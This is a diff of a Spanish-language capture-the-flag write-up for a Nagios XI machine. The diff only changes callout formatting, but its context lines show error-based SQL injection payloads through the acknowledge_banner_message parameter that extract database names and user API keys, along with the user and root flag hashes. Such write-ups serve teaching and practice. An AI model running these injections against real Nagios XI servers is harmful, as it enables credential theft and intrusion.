@@ -193,7 +193,7 @@ action=acknowledge_banner_message&id=3 and extractvalue(1, database())-- -
 > [!ERROR] **Error Esperado (Ejemplo):**
 > `XPATH syntax error: 'nagiosxi'`
 
-> [!TIP] **Solucionando Problemas de Visualización**
+> [!tip] **Solucionando Problemas de Visualización**
 > A veces, el error no muestra el resultado de la consulta porque el XPath no comienza con un carácter válido (como `/`). Para forzar la visualización, se puede concatenar un carácter de nueva línea (`0x0a`) al principio de la subconsulta.
 > ```sql
 > action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a, database())-- -
@@ -205,7 +205,7 @@ La tabla `information_schema.schemata` contiene los nombres de todas las bases d
 action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select schema_name from information_schema.schemata)))-- -
 ```
 
-> [!WARNING] **Error: Subquery returns more than 1 row**
+> [!warning] **Error: Subquery returns more than 1 row**
 > Este error ocurre porque la consulta devuelve múltiples nombres de bases de datos, y `extractvalue` solo puede manejar un resultado a la vez.
 
 Para solucionarlo, puedo usar `group_concat()` para unir todos los resultados en una sola línea, o `LIMIT` para extraerlos uno por uno.
@@ -235,7 +235,7 @@ Uso una consulta para seleccionar el dato que deseo.
 action=acknowledge_banner_message&id=3 and extractvalue(1, concat(0x0a,(select api_key from nagiosxi.xi_users limit 0,1)))-- -
 ```
 
-> [!NOTE] **Manejo de Datos Largos con `substring`**
+> [!note] **Manejo de Datos Largos con `substring`**
 > Los mensajes de error suelen tener un límite de caracteres (ej. 32 o 64). Si el dato que queremos extraer (como una API key) es más largo, no se mostrará completo. Para solucionarlo, usamos la función `substring()` para extraer el dato en fragmentos.
 
 8. **Extracción por Fragmentos**
@@ -377,10 +377,10 @@ ___
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
+> [!flag] `flag{user}`
 > 26ca36f5d5f8d8e87f68c187c69d61b1
-^bandera
+^bandera-user
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 > 3c2c167373f3835145a261924ab15ba9
-^bandera
+^bandera-root
